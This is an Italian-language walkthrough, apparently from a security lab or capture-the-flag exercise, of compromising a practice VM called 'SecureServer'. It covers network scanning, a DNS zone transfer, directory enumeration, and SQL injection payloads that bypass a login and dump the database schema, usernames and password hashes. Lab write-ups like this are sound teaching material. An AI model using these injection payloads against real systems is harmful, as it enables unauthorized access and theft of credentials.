<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<!-- 2022-07-04 lun 08:11 -->
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>VDSI - SecureServer</title>
<meta name="author" content="Andrea Pepe - Matteo Ciccaglione" />
<meta name="generator" content="Org Mode" />
<style>
  #content { max-width: 60em; margin: auto; }
  .title  { text-align: center;
             margin-bottom: .2em; }
  .subtitle { text-align: center;
              font-size: medium;
              font-weight: bold;
              margin-top:0; }
  .todo   { font-family: monospace; color: red; }
  .done   { font-family: monospace; color: green; }
  .priority { font-family: monospace; color: orange; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #e6e6e6;
    border-radius: 3px;
    background-color: #f2f2f2;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: auto;
  }
  pre.src:before {
    display: none;
    position: absolute;
    top: -8px;
    right: 12px;
    padding: 3px;
    color: #555;
    background-color: #f2f2f299;
  }
  pre.src:hover:before { display: inline; margin-top: 14px;}
  /* Languages per Org manual */
  pre.src-asymptote:before { content: 'Asymptote'; }
  pre.src-awk:before { content: 'Awk'; }
  pre.src-authinfo::before { content: 'Authinfo'; }
  pre.src-C:before { content: 'C'; }
  /* pre.src-C++ doesn't work in CSS */
  pre.src-clojure:before { content: 'Clojure'; }
  pre.src-css:before { content: 'CSS'; }
  pre.src-D:before { content: 'D'; }
  pre.src-ditaa:before { content: 'ditaa'; }
  pre.src-dot:before { content: 'Graphviz'; }
  pre.src-calc:before { content: 'Emacs Calc'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-fortran:before { content: 'Fortran'; }
  pre.src-gnuplot:before { content: 'gnuplot'; }
  pre.src-haskell:before { content: 'Haskell'; }
  pre.src-hledger:before { content: 'hledger'; }
  pre.src-java:before { content: 'Java'; }
  pre.src-js:before { content: 'Javascript'; }
  pre.src-latex:before { content: 'LaTeX'; }
  pre.src-ledger:before { content: 'Ledger'; }
  pre.src-lisp:before { content: 'Lisp'; }
  pre.src-lilypond:before { content: 'Lilypond'; }
  pre.src-lua:before { content: 'Lua'; }
  pre.src-matlab:before { content: 'MATLAB'; }
  pre.src-mscgen:before { content: 'Mscgen'; }
  pre.src-ocaml:before { content: 'Objective Caml'; }
  pre.src-octave:before { content: 'Octave'; }
  pre.src-org:before { content: 'Org mode'; }
  pre.src-oz:before { content: 'OZ'; }
  pre.src-plantuml:before { content: 'Plantuml'; }
  pre.src-processing:before { content: 'Processing.js'; }
  pre.src-python:before { content: 'Python'; }
  pre.src-R:before { content: 'R'; }
  pre.src-ruby:before { content: 'Ruby'; }
  pre.src-sass:before { content: 'Sass'; }
  pre.src-scheme:before { content: 'Scheme'; }
  pre.src-screen:before { content: 'Gnu Screen'; }
  pre.src-sed:before { content: 'Sed'; }
  pre.src-sh:before { content: 'shell'; }
  pre.src-sql:before { content: 'SQL'; }
  pre.src-sqlite:before { content: 'SQLite'; }
  /* additional languages in org.el's org-babel-load-languages alist */
  pre.src-forth:before { content: 'Forth'; }
  pre.src-io:before { content: 'IO'; }
  pre.src-J:before { content: 'J'; }
  pre.src-makefile:before { content: 'Makefile'; }
  pre.src-maxima:before { content: 'Maxima'; }
  pre.src-perl:before { content: 'Perl'; }
  pre.src-picolisp:before { content: 'Pico Lisp'; }
  pre.src-scala:before { content: 'Scala'; }
  pre.src-shell:before { content: 'Shell Script'; }
  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
  /* additional language identifiers per "defun org-babel-execute"
       in ob-*.el */
  pre.src-cpp:before  { content: 'C++'; }
  pre.src-abc:before  { content: 'ABC'; }
  pre.src-coq:before  { content: 'Coq'; }
  pre.src-groovy:before  { content: 'Groovy'; }
  /* additional language identifiers from org-babel-shell-names in
     ob-shell.el: ob-shell is the only babel language using a lambda to put
     the execution function name together. */
  pre.src-bash:before  { content: 'bash'; }
  pre.src-csh:before  { content: 'csh'; }
  pre.src-ash:before  { content: 'ash'; }
  pre.src-dash:before  { content: 'dash'; }
  pre.src-ksh:before  { content: 'ksh'; }
  pre.src-mksh:before  { content: 'mksh'; }
  pre.src-posh:before  { content: 'posh'; }
  /* Additional Emacs modes also supported by the LaTeX listings package */
  pre.src-ada:before { content: 'Ada'; }
  pre.src-asm:before { content: 'Assembler'; }
  pre.src-caml:before { content: 'Caml'; }
  pre.src-delphi:before { content: 'Delphi'; }
  pre.src-html:before { content: 'HTML'; }
  pre.src-idl:before { content: 'IDL'; }
  pre.src-mercury:before { content: 'Mercury'; }
  pre.src-metapost:before { content: 'MetaPost'; }
  pre.src-modula-2:before { content: 'Modula-2'; }
  pre.src-pascal:before { content: 'Pascal'; }
  pre.src-ps:before { content: 'PostScript'; }
  pre.src-prolog:before { content: 'Prolog'; }
  pre.src-simula:before { content: 'Simula'; }
  pre.src-tcl:before { content: 'tcl'; }
  pre.src-tex:before { content: 'TeX'; }
  pre.src-plain-tex:before { content: 'Plain TeX'; }
  pre.src-verilog:before { content: 'Verilog'; }
  pre.src-vhdl:before { content: 'VHDL'; }
  pre.src-xml:before { content: 'XML'; }
  pre.src-nxml:before { content: 'XML'; }
  /* add a generic configuration mode; LaTeX export needs an additional
     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
  pre.src-conf:before { content: 'Configuration File'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.org-right  { text-align: center;  }
  th.org-left   { text-align: center;   }
  th.org-center { text-align: center; }
  td.org-right  { text-align: right;  }
  td.org-left   { text-align: left;   }
  td.org-center { text-align: center; }
  dt { font-weight: bold; }
  .footpara { display: inline; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .equation-container {
    display: table;
    text-align: center;
    width: 100%;
  }
  .equation {
    vertical-align: middle;
  }
  .equation-label {
    display: table-cell;
    text-align: right;
    vertical-align: middle;
  }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  .org-svg { }
</style>
<style type="text/css">
article,aside,details,figcaption,figure,footer,header,hgroup,nav,section,summary{display:block}audio,canvas,video{display:inline-block}audio:not([controls]){display:none;height:0}[hidden]{display:none}html{font-family:sans-serif;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%}body{margin:0}a:focus{outline:thin dotted}a:active,a:hover{outline:0}h1{font-size:2em}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:bold}dfn{font-style:italic}mark{background:#ff0;color:#000}code,kbd,pre,samp{font-family:monospace,serif;font-size:1em}pre{white-space:pre-wrap;word-wrap:break-word}q{quotes:"\201C" "\201D" "\2018" "\2019"}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sup{top:-0.5em}sub{bottom:-0.25em}img{border:0}svg:not(:root){overflow:hidden}figure{margin:0}fieldset{border:1px solid #c0c0c0;margin:0 2px;padding:.35em .625em .75em}legend{border:0;padding:0}button,input,select,textarea{font-family:inherit;font-size:100%;margin:0}button,input{line-height:normal}button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}button[disabled],input[disabled]{cursor:default}input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}input[type="search"]{-webkit-appearance:textfield;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box}input[type="search"]::-webkit-search-cancel-button,input[type="search"]::-webkit-search-decoration{-webkit-appearance:none}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}textarea{overflow:auto;vertical-align:top}table{border-collapse:collapse;border-spacing:0}html{font-family:'PT Sans',sans-serif}pre,code{font-family:'Inconsolata',sans-serif}h1,h2,h3,h4,h5,h6{font-family:'PT Sans Narrow',sans-serif;font-weight:700}html{background-color:#073642;color:#839496;margin:1em}body{background-color:#002b36;margin:0 auto;max-width:23cm;border:1pt solid #586e75;padding:1em}code{background-color:#073642;padding:2px}a{color:#b58900}a:visited{color:#cb4b16}a:hover{color:#cb4b16}h1{color:#d33682}h2,h3,h4,h5,h6{color:#859900}pre{background-color:#002b36;color:#839496;border:1pt solid #586e75;padding:1em;box-shadow:5pt 5pt 8pt #073642}pre code{background-color:#002b36}h1{font-size:2.8em}h2{font-size:2.4em}h3{font-size:1.8em}h4{font-size:1.4em}h5{font-size:1.3em}h6{font-size:1.15em}.tag{background-color:#073642;color:#d33682;padding:0 .2em}.todo,.next,.done{color:#002b36;background-color:#dc322f;padding:0 .2em}.tag{-webkit-border-radius:.35em;-moz-border-radius:.35em;border-radius:.35em}.TODO{-webkit-border-radius:.2em;-moz-border-radius:.2em;border-radius:.2em;background-color:#2aa198}.NEXT{-webkit-border-radius:.2em;-moz-border-radius:.2em;border-radius:.2em;background-color:#268bd2}.ACTIVE{-webkit-border-radius:.2em;-moz-border-radius:.2em;border-radius:.2em;background-color:#268bd2}.DONE{-webkit-border-radius:.2em;-moz-border-radius:.2em;border-radius:.2em;background-color:#859900}.WAITING{-webkit-border-radius:.2em;-moz-border-radius:.2em;border-radius:.2em;background-color:#cb4b16}.HOLD{-webkit-border-radius:.2em;-moz-border-radius:.2em;border-radius:.2em;background-color:#d33682}.NOTE{-webkit-border-radius:.2em;-moz-border-radius:.2em;border-radius:.2em;background-color:#d33682}.CANCELLED{-webkit-border-radius:.2em;-moz-border-radius:.2em;border-radius:.2em;background-color:#859900}
</style>
</head>
<body>
<div id="content" class="content">
<h1 class="title">VDSI - SecureServer</h1>
<div id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#orgde99330">1. Foothold</a>
<ul>
<li><a href="#org7b77a1c">1.1. target machine individuation</a></li>
<li><a href="#orgc8ddc31">1.2. nmap</a></li>
<li><a href="#org56e63ec">1.3. DNS ZT</a></li>
<li><a href="#org7811fb2">1.4. Server web</a>
<ul>
<li><a href="#orga82c76c">1.4.1. gobuster</a></li>
<li><a href="#org3dbfd59">1.4.2. SQL injection 1</a></li>
<li><a href="#orga54a5ac">1.4.3. SQL injection 2</a></li>
</ul>
</li>
<li><a href="#orga55dd65">1.5. Database Information Gathering</a>
<ul>
<li><a href="#org9a39bab">1.5.1. general infos</a></li>
<li><a href="#org8aba187">1.5.2. tables</a></li>
<li><a href="#orgc726454">1.5.3. users</a></li>
</ul>
</li>
<li><a href="#orgf291554">1.6. Password cracking</a></li>
</ul>
</li>
</ul>
</div>
</div>
<div id="outline-container-orgde99330" class="outline-2">
<h2 id="orgde99330"><span class="section-number-2">1.</span> Foothold</h2>
<div class="outline-text-2" id="text-1">
</div>
<div id="outline-container-org7b77a1c" class="outline-3">
<h3 id="org7b77a1c"><span class="section-number-3">1.1.</span> target machine individuation</h3>
<div class="outline-text-3" id="text-1-1">
<pre class="example" id="orgd057b87">
 nmap -sP 192.168.56.0/24                                                                                      1 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-03 12:01 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.101
Host is up (0.00032s latency).
Nmap scan report for 192.168.56.105
Host is up (0.0018s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 6.96 seconds
</pre>
</div>
</div>

<div id="outline-container-orgc8ddc31" class="outline-3">
<h3 id="orgc8ddc31"><span class="section-number-3">1.2.</span> nmap</h3>
<div class="outline-text-3" id="text-1-2">
<pre class="example" id="org2e1a799">
$ sudo nmap -sS 192.168.56.105                                                                              1 ⨯ 1 ⚙
sudo: impossibile risolvere l'host roronoa: Errore temporaneo nella risoluzione del nome
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-03 12:06 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.105
Host is up (0.00020s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
MAC Address: 08:00:27:A2:D0:B4 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
</pre>
</div>
</div>

<div id="outline-container-org56e63ec" class="outline-3">
<h3 id="org56e63ec"><span class="section-number-3">1.3.</span> DNS ZT</h3>
<div class="outline-text-3" id="text-1-3">
<pre class="example" id="orgc2be189">
$ dig axfr @sa.secureserver.vdsi secureserver.vdsi                                                                1 ⚙

; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; axfr @sa.secureserver.vdsi secureserver.vdsi
; (1 server found)
;; global options: +cmd
secureserver.vdsi.	3600	IN	SOA	ns.secureserver.vdsi. sa.secureserver.vdsi. 1 3600 600 86400 3600
secureserver.vdsi.	3600	IN	NS	ns1.secureserver.vdsi.
secureserver.vdsi.	3600	IN	NS	ns2.secureserver.vdsi.
6ee67.secureserver.vdsi. 3600	IN	A	10.1.1.1
8059a.secureserver.vdsi. 3600	IN	A	10.1.1.5
admin.secureserver.vdsi. 3600	IN	A	10.1.1.4
cdn.secureserver.vdsi.	3600	IN	A	10.1.1.3
e16ab.secureserver.vdsi. 3600	IN	CNAME	www.secureserver.vdsi.
git.secureserver.vdsi.	3600	IN	A	10.1.1.4
ns1.secureserver.vdsi.	3600	IN	A	10.0.0.1
ns2.secureserver.vdsi.	3600	IN	A	10.0.0.2
sa.secureserver.vdsi.	3600	IN	A	10.1.1.2
secret.secureserver.vdsi. 3600	IN	A	10.1.1.3
shell.secureserver.vdsi. 3600	IN	A	10.1.1.10
static.secureserver.vdsi. 3600	IN	CNAME	www.secureserver.vdsi.
secureserver.vdsi.	3600	IN	SOA	ns.secureserver.vdsi. sa.secureserver.vdsi. 1 3600 600 86400 3600
;; Query time: 0 msec
;; SERVER: 192.168.56.105#53(sa.secureserver.vdsi) (TCP)
;; WHEN: Sun Jul 03 14:22:46 CEST 2022
;; XFR size: 16 records (messages 1, bytes 404)
</pre>
</div>
</div>

<div id="outline-container-org7811fb2" class="outline-3">
<h3 id="org7811fb2"><span class="section-number-3">1.4.</span> Server web</h3>
<div class="outline-text-3" id="text-1-4">
<p>
Tra i vari nomi DNS individuati, ce n'è uno che risulta essere un vhost:
<b>e16ab.secureserver.htb</b> . Se ci si va, viene mostrato da browser "403 Forbidden".
Tuttavia, sia con curl che da BurpSuite, il codice di ritorno HTTP
è 200. Si tratta di una pagina costruita per ingannare.
</p>

<p>
Enumeriamo le directory del vhost.
</p>
</div>
<div id="outline-container-orga82c76c" class="outline-4">
<h4 id="orga82c76c"><span class="section-number-4">1.4.1.</span> gobuster</h4>
<div class="outline-text-4" id="text-1-4-1">
<pre class="example" id="orgd986ab0">
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://e16ab.secureserver.vdsi -x php,js,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://e16ab.secureserver.vdsi
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php,js
[+] Timeout:                 10s
===============================================================
2022/07/03 19:05:39 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 185] [--&gt; http://e16ab.secureserver.vdsi/css/]
/register.php         (Status: 200) [Size: 560]                                          
/uploads              (Status: 301) [Size: 185] [--&gt; http://e16ab.secureserver.vdsi/uploads/]
/secret.php           (Status: 200) [Size: 1112]                                             
Progress: 116985 / 150005 (77.99%)                                                          [ERROR] 2022/07/03 19:05:49 [!] parse "http://e16ab.secureserver.vdsi/error\x1f_log.php": net/url: invalid control character in URL
                                                                                             
===============================================================
2022/07/03 19:05:52 Finished
===============================================================
</pre>
</div>
</div>

<div id="outline-container-org3dbfd59" class="outline-4">
<h4 id="org3dbfd59"><span class="section-number-4">1.4.2.</span> SQL injection 1</h4>
<div class="outline-text-4" id="text-1-4-2">
<p>
La pagina <b>register.php</b> non è accessibile. Mentre la pagina <b>secret.php</b>
presenta un form di login. Se si vede il sorgente html della pagina,
c'è una riga di un bottone di input di debug con valore false che però
è commentata.
</p>

<p>
Provando a fare il login con credenziali abc:abc allo URL
<b><a href="http://e16ab.secureserver.vdsi/secret.php?debug=true">http://e16ab.secureserver.vdsi/secret.php?debug=true</a></b>, viene stampata
la query che viene effettuata:
</p>
<pre class="example" id="org760408b">
SELECT * FROM users where (username='abc') AND (password = '900150983cd24fb0d6963f7d28e17f72')
</pre>

<p>
Facciamo SQL injection sullo username, inserendo:
</p>
<pre class="example" id="org18711b7">
a') OR 1=1; #
</pre>

<p>
Si viene redirezionati alla pagina:
<b><a href="http://e16ab.secureserver.vdsi/S34rch_ev3ryWh3ree.php">http://e16ab.secureserver.vdsi/S34rch_ev3ryWh3ree.php</a></b>.
</p>
</div>
</div>

<div id="outline-container-orga54a5ac" class="outline-4">
<h4 id="orga54a5ac"><span class="section-number-4">1.4.3.</span> SQL injection 2</h4>
<div class="outline-text-4" id="text-1-4-3">
<p>
Questa pagina presenta un altro form (HTTP POST), con cui è possibile
cercaare dei prodotti inserendo una stringa. Non inserendo nulla e
premendo il pulsante per la ricerca, appare la seguente tabella:
</p>


<div id="org3b4484c" class="figure">
<p><img src="./img/tabella.png" alt="tabella.png" />
</p>
</div>

<p>
Se si guarda il sorgente della pagina, e c'è sempre un riferimento al
campo debug, ma stavolta non è utile, viene esplicitamente indicato
che non verrà fornita alcuna info di debug (molto simpaticamente :) ).
</p>

<p>
Proviamo ad inserire qualche lettera e vediamo che succede:
<img src="./img/tabella_input_b.png" alt="tabella_input_b.png" />
</p>

<p>
Vengono mostrati solo i file che iniziano con la lettera inserita. La
query sarà qualcosa del tipo:
</p>
<pre class="example" id="org2732aa8">
SELECT * FROM products WHERE product_name LIKE '${input}%'
</pre>

<p>
Proviamo ad usare l'apice e vediamo cosa succede.
<img src="./img/b_apice.png" alt="b_apice.png" />
</p>


<p>
Sembra crashare. Anche inserendo la stringa <b>b%'</b> è lo stesso. Proviamo
a mettere un commento dopo e vediamo se riusciamo ad ottenere le
stesse righe di prima.
Come visibile dalla seguente immagine, inserendo la stringa <b>b%' #</b> si
ottiene quanto atteso.
<img src="./img/hashtag.png" alt="hashtag.png" />
</p>


<p>
A questo punto, proviamo a fare delle SQL injections di tipo <b>UNION
SELECT</b> per ottenere informazioni. Dalla tabella mostrata, siamo sicuri
che almeno 4 colonne ci sono, ma probabilmente saranno almeno 5, in
quanto sembra plausibile che per record del genere ci sia una colonna
ID.
</p>

<p>
Effettivamente, la tabella ha 5 colonne. L'injection che l'ha rivelato
è stata: <b>%' UNION SELECT ALL 1,2,3,4,5 #</b>:
<img src="./img/5columns.png" alt="5columns.png" />
</p>
</div>
</div>
</div>


<div id="outline-container-orga55dd65" class="outline-3">
<h3 id="orga55dd65"><span class="section-number-3">1.5.</span> Database Information Gathering</h3>
<div class="outline-text-3" id="text-1-5">
</div>
<div id="outline-container-org9a39bab" class="outline-4">
<h4 id="org9a39bab"><span class="section-number-4">1.5.1.</span> general infos</h4>
<div class="outline-text-4" id="text-1-5-1">
<p>
Continuiamo a sfruttare la SWL injection per ottenere nome del
database, dell'utente con cui gira, della versione del DB.
Lo facciamo con il seguente payload iniettato:
</p>
<pre class="example" id="org48781a7">
%' UNION SELECT ALL 1,database(),user(),version(),5 #
</pre>

<div id="org348e55b" class="figure">
<p><img src="./img/dbinfo.png" alt="dbinfo.png" />
</p>
</div>

<p>
Dunque abbiamo:
</p>
<ul class="org-ul">
<li>DB name = <b>sqlitraining</b>
utente = <b>root</b>
versione = <b>8.0.26</b></li>
</ul>
</div>
</div>


<div id="outline-container-org8aba187" class="outline-4">
<h4 id="org8aba187"><span class="section-number-4">1.5.2.</span> tables</h4>
<div class="outline-text-4" id="text-1-5-2">
<p>
Vediamo quali tables sono presenti nel database, facendoci restituire
la colonna <b>table<sub>name</sub></b> da INFORMATION<sub>SCHEMA.columns</sub> con il seguente
payload:
</p>
<pre class="example" id="org9a3d185">
%' UNION SELECT 1,table_name,3,4,5 from information_schema.columns #
</pre>
<p>
Ce ne sono tanti, molti di più di quelli visibili nella seguente
immagina, ma uno interessante può essere <b>users</b>, che contiene gli
username e le hash delle passwords degli utenti.
<img src="./img/table_name.png" alt="table_name.png" />
</p>
</div>
</div>

<div id="outline-container-orgc726454" class="outline-4">
<h4 id="orgc726454"><span class="section-number-4">1.5.3.</span> users</h4>
<div class="outline-text-4" id="text-1-5-3">
<p>
Per scoprire i nomi delle colonne della tabella <b>users</b> usiamo il
seguente payload:
</p>
<pre class="example" id="org0f91616">
%' UNION SELECT 1,column_name,3,4,5 from information_schema.columns where table_name = 'users' #
</pre>

<div id="orgdd71914" class="figure">
<p><img src="./img/users_column.png" alt="users_column.png" />
</p>
</div>


<p>
Prendiamo username, password e description con la seguente query
iniettata:
</p>
<pre class="example" id="org2281e1d">
' UNION SELECT 1,username,password,description,5 from users #
</pre>
<p>
Si ottiene quanto segue:
<img src="./img/password.png" alt="password.png" />
</p>


<p>
Tutti gli utenti hanno la stessa password hashata, proviamo a
crackarla.
</p>

<p>
Tuttavia, la password non viene mostrata tutta per questioni di
spazio. Dobbiamo estrarla pezzo per pezzo, usando la funzione SQL
<b>SUBSTRING(string, pos, len)</b>. Notare che pos parte da 1.
</p>
<pre class="example" id="orgb1ffad9">
' UNION SELECT 1,username,SUBSTRING(password, 1, 10),4,5 from users #
</pre>

<p>
Pezzi:
0c4fce23e1
16d23f8d25
526071ca6e
3a
</p>

<p>
In realtà è lunga uguale!
</p>
</div>
</div>
</div>

<div id="outline-container-orgf291554" class="outline-3">
<h3 id="orgf291554"><span class="section-number-3">1.6.</span> Password cracking</h3>
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="date">Date: 03/07/2022</p>
<p class="author">Author: Andrea Pepe - Matteo Ciccaglione</p>
<p class="date">Created: 2022-07-04 lun 08:11</p>
<p class="validation"><a href="https://validator.w3.org/check?uri=referer">Validate</a></p>
</div>
</body>
</html>
